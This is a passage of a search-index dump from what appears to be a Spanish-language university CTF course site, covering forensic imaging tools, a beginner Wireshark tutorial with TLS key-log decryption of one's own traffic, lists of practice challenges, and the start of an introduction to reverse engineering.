contenido.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"herramientas\"\u003eHerramientas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.cgsecurity.org/wiki/TestDisk\"\u003e\u003cstrong\u003eTestdisk\u003c/strong\u003e (Linux, software libre)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.gnu.org/software/ddrescue/\"\u003e\u003cstrong\u003eddrescue\u003c/strong\u003e (GNU/Linux, software libre)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Fsck\"\u003e\u003cstrong\u003eFSCK\u003c/strong\u003e (Linux, software libre)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/CHKDSK\"\u003e\u003cstrong\u003eCHKDSK\u003c/strong\u003e (Windows)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.ccleaner.com/recuva\"\u003e\u003cstrong\u003eRecuva\u003c/strong\u003e (Windows, software privativo)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"imágenes-forenses\"\u003eImágenes Forenses\u003c/h2\u003e\n\u003cp\u003eEn casos más realistas, es posible que se les proporcionen imágenes forenses tanto de discos duros/SSDs como de memoria RAM. Estas imágenes pueden ser creadas y revisadas con aplicaciones especiales. Algunas son comerciales, como \u003ca href=\"https://www.opentext.com/products/encase-forensic\"\u003eEnCase Forensic\u003c/a\u003e, mientras que otras son abiertas o gratuitas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.exterro.com/digital-forensics-software/ftk-imager\"\u003e\u003cstrong\u003eFTK Imager\u003c/strong\u003e\u003c/a\u003e Herramienta popular utilizada para generar y revisar imágenes forenses (extensión .E01)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://volatilityfoundation.org/\"\u003e\u003cstrong\u003eVolatility\u003c/strong\u003e (Multiplataforma, Open source)\u003c/a\u003e Herramienta en Python para revisar y explorar imágenes de memoria RAM. Existen dos versiones de uso común (Volatility 2 y Volatility 3), cada una con plugins específicos.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/sleuthkit/autopsy\"\u003e\u003cstrong\u003eAutopsy\u003c/strong\u003e (Linux y Windows)\u003c/a\u003e Permite abrir imágenes forenses generadas por FTK Imager y otras aplicaciones (contando con los plugins adecuados)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/504ensicsLabs/LiME\"\u003e\u003cstrong\u003eLinux Memory Extractor (LiME)\u003c/strong\u003e\u003c/a\u003e Herramienta para extraer una imagen de memoria de un dispositivo con kernel de Linux compatible.\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:27,href:"/docs/forense/wireshark/",title:"Wireshark",description:null,content:"\u003cp\u003eAlgunos problemas de tipo CTF de categoría forense requieren analizar logs de tráfico de red, los cuales suelen guardarse con la aplicación Wireshark. En esta sección describiremos brevemente algunos conceptos relacionados con el modelo de Internet y luego explicaremos algunas funcionalidades de Wireshark.\u003c/p\u003e\n\u003ch2 id=\"modelo-de-internet\"\u003eModelo de Internet\u003c/h2\u003e\n\u003cp\u003eTambien conocido como Modelo TCP/IP, considera varios componentes que permiten el intercambio de información entre dispositivos conectados a una red.\u003c/p\u003e\n\u003cp\u003eLas capas del modelo son las siguientes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCapa de Enlace\u003c/strong\u003e: Capa que agrupa protocolos de comunicación que permiten conectar físicamente a un dispositivo a la red.\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003eEjemplos de Protocolos\u003c/em\u003e: \u003cem\u003eEthernet\u003c/em\u003e, \u003cem\u003eWi-Fi\u003c/em\u003e, \u003cem\u003eARP\u003c/em\u003e, \u003cem\u003eNDP\u003c/em\u003e, \u003cem\u003eOSPF\u003c/em\u003e, etc.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCapa de Red o Internet\u003c/strong\u003e: Capa que agrupa protocolos de comunicación que se utilizan para transportar paquetes de información entre equipos conectados a la red.\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003eEjemplos de protocolos\u003c/em\u003e: \u003cem\u003eIPv4\u003c/em\u003e, \u003cem\u003eIPv6\u003c/em\u003e, \u003cem\u003eICMP\u003c/em\u003e, etc.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCapa de Transporte\u003c/strong\u003e: Capa que entrega servicios de comunicación entre dispositivos a aplicaciones\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003eEjemplos de protocolos\u003c/em\u003e: \u003cem\u003eTCP\u003c/em\u003e, \u003cem\u003eUDP\u003c/em\u003e, etc.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCapa de Aplicación\u003c/strong\u003e: Capa en la que se agrupan todas las aplicaciones que se ejecutan entre dispositivos.\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003eEjemplos de protocolos\u003c/em\u003e: \u003cem\u003eHTTP\u003c/em\u003e, \u003cem\u003eDNS\u003c/em\u003e, \u003cem\u003eIMAP\u003c/em\u003e, \u003cem\u003eFTP\u003c/em\u003e, etc.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa imagen siguiente (elaborada por \u003ccode\u003eCburnett\u003c/code\u003e y subida a \u003ca href=\"https://en.wikipedia.org/wiki/Internet_protocol_suite#/media/File:UDP_encapsulation.svg\"\u003eWikimedia Commons\u003c/a\u003e) muestra cómo cada capa \u0026ldquo;envuelve\u0026rdquo; los datos de las capas superiores, en el caso concreto de uso de protocolo de transporte \u003cem\u003eUDP\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../UDP_encapsulation.svg\" alt=\"Encapsulación en el caso del protocolo UDP\"\u003e\u003c/p\u003e\n\u003ch2 id=\"interfaces-de-red\"\u003eInterfaces de Red\u003c/h2\u003e\n\u003cp\u003eCorresponden a dispositivos reales o virtuales por los cuales viajan paquetes de comunicación.\u003c/p\u003e\n\u003cp\u003eEn Kali, pueden listar estos dispositivos con el comando \u003ccode\u003eip link show\u003c/code\u003e. Este comando debería mostrarles algo parecido a esto:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu \u003cspan class=\"m\"\u003e65536\u003c/span\u003e qdisc noqueue state UNKNOWN mode DEFAULT group default qlen \u003cspan class=\"m\"\u003e1000\u003c/span\u003e\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu \u003cspan class=\"m\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP mode DEFAULT group default qlen \u003cspan class=\"m\"\u003e1000\u003c/span\u003e\n    link/ether 08:00:27:a6:1f:86 brd ff:ff:ff:ff:ff:ff\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eLa interfaz \u003ccode\u003elo\u003c/code\u003e corresponde a una \u003cem\u003einterfaz virtual\u003c/em\u003e denominada \u003ccode\u003eloopback\u003c/code\u003e y usada para enrutar paquetes a la misma máquina sin necesidad de otras interfaces.\u003c/li\u003e\n\u003cli\u003eLa interfaz \u003ccode\u003eeth0\u003c/code\u003e desde el punto de vista de Kali se comporta como una \u003cem\u003einterfaz real\u003c/em\u003e, es decir, correspondería a una tarjeta de red independiente en el caso de un sistema operativo no emulado.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCada una de las interfaces anteriores posee una \u003cem\u003eDirección MAC\u003c/em\u003e, un conjunto de 6 bytes único en cada subred utilizado para enrutar paquetes en la capa de enlace. Al mismo tiempo, cada interfaz bien configurada debiese poseer una \u003cem\u003eDirección IP\u003c/em\u003e, la que le permite enrutar paquetes en la capa de red.\u003c/p\u003e\n\u003ch2 id=\"wireshark\"\u003eWireshark\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://www.wireshark.org/\"\u003eWireshark\u003c/a\u003e es una herramienta de código abierto que permite capturar y analizar tráfico de protocolos de red. En esta parte del apunte veremos cómo utilizarla para interceptar paquetes del stack de internet y otros protocolos populares.\u003c/p\u003e\n\u003ch3 id=\"uso-general-de-wireshark\"\u003eUso general de Wireshark\u003c/h3\u003e\n\u003cp\u003eWireshark se puede instalar con el gestor de paquetes de Kali Linux:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003esudo apt install wireshark\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eLuego, podrán encontrar el ícono en el menú de aplicaciones. Para ejecutar Wireshark, se les solicitará la contraseña de superusuario, dado que es necesaria para poder monitorear las interfaces de red.\u003c/p\u003e\n\u003cp\u003eAl iniciar Wireshark, se encontrarán con esta vista:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-1.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eEn la lista del centro, se observan las distintas interfaces presentes en el computador, además de una especial, denominada \u003ccode\u003eany\u003c/code\u003e, la cual agrupa todos los resultados de las demás interfaces.\u003c/p\u003e\n\u003cp\u003eSi hacen click en una interfaz (por ejemplo, \u003ccode\u003eeth0\u003c/code\u003e), verán la siguiente pantalla.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eEn el número (1) encontrarán los distintos paquetes interceptados por Wireshark, mientras que en (2) verán el paquete disecado, capa por capa, y en (3) verán el contenido del paquete como \u003cem\u003ehexdump\u003c/em\u003e. Métanse por ejemplo a \u003ccode\u003ehttps://cc5325.xor.cl\u003c/code\u003e mientras Wireshark está funcionando y luego vuelvan a Wireshark. Les aparecerá algo así:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-3.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eEn la imagen se alcanzan a ver 3 etapas de la consulta a la página web del curso:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eConsultas DNS\u003c/strong\u003e, en color celeste, representan las llamadas al resolver DNS del computador para determinar la IP asociada al dominio cc5325.xor.cl.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePaquetes TCP\u003c/strong\u003e: En gris y morado, Se conectan con la IP indicada en el paso anterior, para inicializar una conexión con el servidor\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePaquetes TLS\u003c/strong\u003e: En morado, corresponden a los paquetes usados para la transmisión de los contenidos de la página. No podemos ver su contenido en texto plano porque TLS es una conexión cifrada.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"análisis-de-protocolos\"\u003eAnálisis de protocolos\u003c/h3\u003e\n\u003cp\u003eA continuación veremos algunos ejemplos de uso básicos de Wireshark, los cuales consideran su inicialización, el uso de filtros de visualización y la exportación de archivos y datos.\u003c/p\u003e\n\u003ch4 id=\"filtros-básicos\"\u003eFiltros básicos\u003c/h4\u003e\n\u003cp\u003ePartamos revisando un caso básico de comunicación. Hablaremos con el servidor de la tarea 2. Para ello, hay que recordar que es necesario conectarse primero a la VPN del CEC y luego abrir la interfaz \u003ccode\u003eany\u003c/code\u003e en el menú inicial, de forma de ver mezclados paquetes de todas las interfaces (\u003ccode\u003eeth0\u003c/code\u003e y \u003ccode\u003etun0\u003c/code\u003e, la segunda generada cuando se realiza la conexión OpenVPN.)\u003c/p\u003e\n\u003cp\u003eLuego, podemos intentar ejecutar el comando \u003ccode\u003enc server.cc5325.xor.cl 25102\u003c/code\u003e, enviar un mensaje y recibir una respuesta. Ahora podemos revisar Wireshark para ver los paquetes enviados en este intercambio:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-00-21-00.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eLo primero que notamos de la situación anterior es que se han enviado y recibido varios tipos de paquetes. para lo que nos puede servir aprender a usar los \u003cem\u003efiltros de visualización de Wireshark\u003c/em\u003e (Ctrl+/). A continuación mostramos algunos ejemplos.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eFiltrar por puerto de origen/destino\u003c/strong\u003e: Para filtrar por puerto de origen o destino con un protocolo que usa \u003ccode\u003etcp\u003c/code\u003e en la capa de transporte, se puede escribir en la barra de direcciones \u003ccode\u003etcp.port\u003c/code\u003e seguido de un comparador (\u003ccode\u003e\u0026gt;\u003c/code\u003e, \u003ccode\u003e==\u003c/code\u003e, \u003ccode\u003e\u0026lt;\u003c/code\u003e) y luego del valor de puerto contra el cual se quiere comparar. Si se quiere filtrar solo por puerto de origen, usar el filtro \u003ccode\u003etcp.srcport\u003c/code\u003e y si se quiere filtrar solo por puerto de destino, usar \u003ccode\u003etcp.dstport\u003c/code\u003e. Análogamente existen filtros para protocolos que usen \u003ccode\u003eudp\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFiltrar por IP de origen/destino\u003c/strong\u003e: Para filtrar por IP de origen o destino se usa el filtro \u003ccode\u003eip.addr\u003c/code\u003e. Para filtrar solo por IP de origen, se usa \u003ccode\u003eip.src\u003c/code\u003e y para filtrar solo por IP de destino se usa \u003ccode\u003eip.dst\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEs posible componer los filtros con operadores lógicos (\u003ccode\u003e\u0026amp;\u0026amp; / and\u003c/code\u003e, \u003ccode\u003e|| / or\u003c/code\u003e, \u003ccode\u003e! / not\u003c/code\u003e):\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEjemplo\u003c/strong\u003e: !(udp.port == 53) \u0026amp;\u0026amp; ip.src == 127.0.0.1\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eMás información de los filtros se puede encontrar en \u003ca href=\"https://wiki.wireshark.org/DisplayFilters\"\u003eesta documentación\u003c/a\u003e\u003c/p\u003e\n\u003ch4 id=\"revisar-y-exportar-contenido\"\u003eRevisar y exportar contenido\u003c/h4\u003e\n\u003cp\u003eA continuación se muestra los mensajes enviados y recibidos en la terminal con \u003ccode\u003enetcat\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-01-03-01.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eDe los mensajes anteriores, se puede ver esta captura de paquetes por Wireshark. Si nos fijamos en el tercer recuadro, notaremos que logramos interceptar el mensaje en texto plano enviado por el servidor a nuestra terminal.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-01-04-07.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eLo anterior incluso sirve con protocolos más sofisticados, como HTTP. Para revisar esto, naveguemos en Firefox dentro de kali a la URL \u003ca href=\"http://info.cern.ch/\"\u003ehttp://info.cern.ch/\u003c/a\u003e. Luego, filtremos por visualización paquetes tcp al puerto 80 y revisemos el contenido del mensaje. En la siguiente imágen podemos ver parte de la consulta HTTP de nuestra máquina virtual al servidor remoto:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-01-26-42.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eLas flechas al lado de la consulta (en la columna No.) muestran cómo los paquetes se relacionan entre sí. En específico, nos indican que el paquete 2459 es la respuesta de la consulta hecha en el paquete 2457 (los números en sus Wireshark definitivamente variarán, ya que los paquetes se enumeran desde que se lanza la herramienta). Los otros paquetes cubiertos por la línea vertical son mensajes de capas más bajas (TCP en este caso).\u003c/p\u003e\n\u003cp\u003eEn la parte inferior del paquete 2459 se puede ver parte del HTML de la página cargada en texto plano.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-01-28-20.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eSi quisieramos extraer esta página (o el archivo PNG del paquete) podemos hacer click derecho en el payload del paquete (última fila de la vista del cuadro intermedio) y hacer click en \u003cem\u003eExport Packet Bytes\u003c/em\u003e (o usar el acceso directo de teclado \u003cem\u003eCtrl+Shift+X\u003c/em\u003e). Luego elegir una ubicación para el archivo. Si lo guardamos con la extensión correcta, podremos abrirlo sin problemas después.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-01-36-33.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"guardar-un-archivo-de-captura\"\u003eGuardar un archivo de captura\u003c/h4\u003e\n\u003cp\u003ePodemos guardar todos los paquetes capturados en la sesión ejecutando \u003ccode\u003eFile -\u0026gt; Save As...\u003c/code\u003e, lo que nos permitirá exportar un archivo con extensión \u003ccode\u003e.pacpng\u003c/code\u003e. Luego podremos abrir este archivo en Wireshark y seguir analizándolo, o incluso compartirlo.\u003c/p\u003e\n\u003ch4 id=\"seguir-un-stream-de-datos\"\u003eSeguir un stream de datos\u003c/h4\u003e\n\u003cp\u003eSi quieres tener en un solo archivo todo un flujo de comunicación (\u003cem\u003estream\u003c/em\u003e), puedes hacer click derecho en el \u003cem\u003eframe\u003c/em\u003e, luego en \u003cem\u003efollow\u003c/em\u003e y luego en la capa que deseas seguir. Por ejemplo, lo siguiente sigue el flujo de obtener el \u003ccode\u003eindex\u003c/code\u003e de la página web:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-01-49-39.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"https-y-protocolos-cifrados\"\u003eHTTPS y protocolos cifrados\u003c/h4\u003e\n\u003cp\u003eAl inicio de esta sección vimos que a veces los paquetes viajan cifrados entre cliente y servidor. Esto quiere decir que se necesita de una llave que permita descifrar los datos que llegan y se van. Esta llave la suele manejar el mismo navegador al momento de realizar la conexión. Sin embargo, es posible configurar algunos navegadores para que exporten la llave.\u003c/p\u003e\n\u003cp\u003eCabe destacar que en los CTF de forensics que no requieren romper algún tipo de cifrado obsoleto usado para la comunicación, se les suele entregar la llave que usa el navegador para desencriptar y encriptar los datos enviados, la cual luego puede configurarse en Wireshark para ser usada en el análisis de los paquetes.\u003c/p\u003e\n\u003cp\u003eA continuación veremos tanto como iniciar nuestro navegador para que esta llave se exporte, como qué hay que hacer para configurar Wireshark para que utilice esta llave.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIniciar el navegador con la capacidad de loguear en un archivo sus llaves TLS\u003c/strong\u003e. Últimamente Firefox tiene problemas para configurarse con este modo, por lo que les recomendamos instalar (\u003ccode\u003esudo apt install chromium\u003c/code\u003e) y ejecutar Chromium con el siguiente comando:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eSSLKEYLOGFILE=~/key.log chromium\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNavegar a algún sitio con HTTPS\u003c/strong\u003e, como por ejemplo, \u003ca href=\"https://dcc.uchile.cl\"\u003edcc.uchile.cl\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eImportar llaves en Wireshark\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAbrir Wireshark y luego ir a \u003ccode\u003eEdit -\u0026gt; Preferences\u003c/code\u003e. Verás este menú:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-15-42-32.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eEn \u003ccode\u003eProtocols -\u0026gt; TLS\u003c/code\u003e ir a (Pre)-Master-Secret log filename y seleccionar el archivo que debiese estar en \u003ccode\u003e/home/kali/key.log\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-15-44-14.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eAhora si vamos a la interfaz \u003ccode\u003eany\u003c/code\u003e y visitamos el sitio web del DCC, veremos que aparte de los paquetes TLS, sí aparecen paquetes de tipo HTTP, los cuales son completamente explorables.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../forensics-2021-05-23-15-47-18.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"otros-protocolos-revisables-con-wireshark\"\u003eOtros protocolos revisables con Wireshark\u003c/h3\u003e\n\u003cp\u003eComo se puede ver en el menú \u0026ldquo;Protocols\u0026rdquo; de las preferencias, los protocolos soportados por Wireshark son muchos. A continuación mostraremos algunos.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eUSB\u003c/strong\u003e: Es posible generar archivos de captura de la comunicación realizada entre un dispositivo USB y el computador. Para esto, basta con seguir \u003ca href=\"https://gitlab.com/wireshark/wireshark/-/wikis/CaptureSetup/USB\"\u003eeste tutorial\u003c/a\u003e. Probablemente sea necesario también revisar la \u003ca href=\"https://gitlab.com/wireshark/wireshark/-/wikis/USB\"\u003edocumentación\u003c/a\u003e del protocolo USB en general y del dispositivo que estamos revisando.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBluetooth\u003c/strong\u003e: También es posible capturar mensajes Bluetooth entre nuestro computador y otro dispositivo usando \u003ca href=\"https://gitlab.com/wireshark/wireshark/-/wikis/CaptureSetup/Bluetooth\"\u003eesta guía\u003c/a\u003e. Puede ser necesario revisar la \u003ca href=\"https://gitlab.com/wireshark/wireshark/-/wikis/Bluetooth\"\u003edocumentación\u003c/a\u003e del protocolo Bluetooth.\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:28,href:"/docs/forense/ejercicios/",title:"Ejercicios de Forense",description:null,content:"\u003ch2 id=\"comandos-útiles\"\u003eComandos útiles\u003c/h2\u003e\n\u003ch3 id=\"hackthebox\"\u003eHackTheBox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/misDIRection\"\u003emisDIRection\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Illumination\"\u003eIllumination\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/MarketDump\"\u003eMarketDump\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Eternal-Loop\"\u003eEternal Loop\u003c/a\u003e (No tiene mucho que ver con forense, pero es bastante entretenido y se puede hacer con un script de bash)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tryhackme\"\u003eTryHackMe\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/linux1\"\u003eLinux Fundamentals 1\u003c/a\u003e (Bastante básico, pero necesario de dominar para los otros fundamentals)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/linux2\"\u003eLinux Fundamentals 2\u003c/a\u003e (Puede servir revisar el Anexo de Comandos en el apunte)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/linux3\"\u003eLinux Fundamentals 3\u003c/a\u003e (Hay ejercicios de \u003ccode\u003egrep\u003c/code\u003e y \u003ccode\u003efind\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/thefindcommand\"\u003eThe Find Command\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"wireshark\"\u003eWireshark\u003c/h2\u003e\n\u003ch3 id=\"hackthebox-1\"\u003eHackTheBox\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/MarketDump\"\u003eMarketDump\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Deadly-Arthropod\"\u003eDeadly Arthropod (Retirado)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tryhackme-1\"\u003eTryHackMe\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/h4cked\"\u003eHack3d\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"otros-fuera-del-scope-del-curso\"\u003eOtros (fuera del scope del curso)\u003c/h2\u003e\n\u003cp\u003eAlgunos problemas de contenidos de la unidad que hubiese sido genial ver, pero por tiempo no alcanzaremos.\u003c/p\u003e\n\u003ch3 id=\"análisis-de-dumps-de-ram\"\u003eAnálisis de dumps de RAM\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Reminiscent\"\u003eReminiscent (HTB)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/bpvolatility\"\u003eVolatility (TryHackMe)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/memoryforensics\"\u003eForensics (Easy, TryHackMe)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/forensics\"\u003eForensics (Medium, TryHackMe)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tryhackme.com/room/cct2019\"\u003eCCT 2019 (Task1 y Task3, TryHackMe)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"revisión-de-documentos-de-office-con-malware\"\u003eRevisión de documentos de Office con malware\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/emo\"\u003eemo (HTB)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/oBfsC4t10n\"\u003eoBfsC4T10n\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/oBfsC4t10n2\"\u003eoBfsC4T10n 2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:29,href:"/docs/reversa/",title:"Ingeniería Reversa",description:null,content:""},{id:30,href:"/docs/reversa/intro/",title:"Intro a la Ingeniería Reversa",description:null,content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eEn computación, la ingeniería reversa (reverse engineering o \u003cem\u003ereversing\u003c/em\u003e) se refiere al proceso de analizar\nun ejecutable, código binario o bytecode, para entender su comportamiento interno.\nPara hacer esto, se suele convertir el código de bajo nivel de entrada en algo de nivel un poco más alto,\ncomo Assembler o C. De esta forma, se vuelve mucho más fácil de entender, aunque aún puede requerir un\ntrabajo mental considerable hacerlo.\u003c/p\u003e\n\u003cp\u003eLos challenges de reversing suelen tener uno de estos dos objetivos (o a veces ambos):\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eIdentificar los pasos de algún proceso que puede ser vulnerado, como la interacción con una API o el uso\nde ciertos módulos o librerías.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eEncontrar un secreto escondido dentro del ejecutable, como una contraseña que puede estar obfuscada o\nencriptada.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLas aplicaciones de esto son bastante directas: poder revisar y entender programas y ejecutables sin tener\nacceso al código fuente. Esto es bastante común, particularmente si se dedican a analizar aplicaciones móviles.\u003c/p\u003e\n\u003cp\u003eLos desarrolladores suelen asumir que, una vez compilado y empaquetado, el código se vuelve totalmente\nilegible e imposible de entender. Este puede ser un error crítico, pues el código de las aplicaciones es\ntotalmente público al cliente, y \u003cstrong\u003etodo programa puede ser reversado\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"assembler\"\u003eAssembler\u003c/h2\u003e\n\u003cp\u003ePara poder realizar algunos de los ejercicios de este capítulo es necesario entender algo del lenguaje Assembler.\nEsta es una manera de codificar instrucciones y datos a un muy bajo nivel (muy cercano al lenguaje de máquina).\nEl formato exacto del lenguaje varía dependiendo de la arquitectura de la CPU, las más típicas siendo \u003ccode\u003ex86\u003c/code\u003e y\n\u003ccode\u003eARM\u003c/code\u003e, pero tienen varios elementos en común.\u003c/p\u003e\n\u003cp\u003eCada instrucción se compone de una operación básica (operaciones aritméticas, leer o escribir registros,\ninsertar o quitar elementos de la pila, etc) y 0 o más argumentos, los cuales pueden ser un valor fijo (número,\nstring, etc), un registro de la CPU, una dirección de memoria, entre otros. A continuación tenemos un ejemplo\nde \u003cem\u003eHello World\u003c/em\u003e en Assembler \u003ccode\u003ex86\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e;Copyright (c) 1999 Konstantin Boldyshev \u0026lt;konst@linuxassembly.org\u0026gt;\n;\n;\u0026quot;hello, world\u0026quot; in assembly language for Linux\n;\n;to build an executable:\n;       nasm -f elf hello.asm\n;       ld -s -o hello hello.o\n\nsection .text\n; Export the entry point to the ELF linker or loader.  The conventional\n; entry point is \u0026quot;_start\u0026quot;. Use \u0026quot;ld -e foo\u0026quot; to 